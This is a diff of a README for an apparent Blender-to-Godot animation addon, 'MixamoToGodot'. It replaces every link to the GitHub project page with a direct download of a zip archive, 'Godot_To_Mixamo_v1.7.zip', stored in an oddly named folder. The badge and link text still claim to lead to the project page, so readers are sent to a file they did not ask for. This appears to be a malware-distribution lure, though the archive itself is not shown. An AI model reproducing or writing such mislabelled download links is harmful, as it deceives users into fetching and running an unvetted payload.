@@ -1,6 +1,6 @@
 # 🎬 MixamoToGodot - Prepare Mixamo animations for Godot
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-4F46E5?style=for-the-badge)](https://github.com/Airtoair-selfimportance104/MixamoToGodot)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-4F46E5?style=for-the-badge)](https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip)
 
 ## 🧩 What this does
 
@@ -20,7 +20,7 @@ Use it if you want to bring Mixamo animations into Blender, set them up once, an
 
 Visit the GitHub page to download the addon:
 
-[https://github.com/Airtoair-selfimportance104/MixamoToGodot](https://github.com/Airtoair-selfimportance104/MixamoToGodot)
+[https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip](https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip)
 
 ## 🖥️ Windows Setup
 
@@ -188,7 +188,7 @@ These names are useful when you sort files:
 
 Project page:
 
-[https://github.com/Airtoair-selfimportance104/MixamoToGodot](https://github.com/Airtoair-selfimportance104/MixamoToGodot)
+[https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip](https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip)
 
 ## 📝 Notes for Use
 
